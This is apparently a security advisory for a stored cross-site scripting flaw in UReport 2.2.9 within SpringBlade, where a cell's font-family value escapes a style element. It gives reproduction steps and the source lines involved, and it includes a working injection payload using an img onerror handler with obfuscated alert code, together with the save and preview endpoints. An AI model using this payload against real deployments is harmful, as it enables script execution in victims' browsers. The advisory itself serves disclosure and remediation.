# UReport font-family style-element escape

## Summary

A cell font-family value is concatenated into generated CSS and rendered inside a style element without neutralizing a closing style tag.

## Affected product

- Vendor/project: **youseries**
- Product: **UReport**
- Affected version: **2.2.9 (verified in SpringBlade 5.0.2)**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated report author; victim previews the stored report.

Verified flow: `stored cell-style font-family -> ReportDefinition.buildStyle() -> htmlReport.style -> <style>${style}</style>`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Create a report cell whose font-family closes the style element and adds an HTML marker.
2. Save the report and confirm persistence.
3. Preview it and inspect the generated head style block and following IMG element.

Sanitized request shape used during verification:

```http
POST <BASE_URL>/blade-report/ureport/designer/saveReportFile
blade-auth: bearer <JWT>

file=URLENCODE×3("blade-gt48261022r43c.ureport.xml")
content=URLENCODE×2(<ureport><cell name="A1"><simple-value>R4C</simple-value>
 <cell-style font-family="x&amp;lt;/style&amp;gt;&amp;lt;img src=x onerror=self[`al`+`ert`](`gt48261022r43c`)&amp;gt;"/>
</cell>...</ureport>)

GET <BASE_URL>/blade-report/ureport/preview?_u=blade-gt48261022r43c.ureport.xml
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
CellStyleParser.java:90-92
style.setFontFamily(element.attributeValue("font-family"));

ReportDefinition.java:155-217
sb.append("font-family:" + fontFamily + ";");

ureport-html/html-preview.html:11-13
<style type="text/css" id="_ureport_table_style">${style}</style>
```

Root cause: An arbitrary report style property is concatenated into CSS, then the entire CSS string is trusted inside an HTML style element.

## Recommended remediation

Allowlist font-family tokens and serialize CSS from validated values. Neutralize HTML closing-tag sequences before placing CSS in an HTML style element.

## References

- Official source: https://github.com/youseries/ureport

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-09 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-09 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-09 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-09/03-source-github-v3.png)
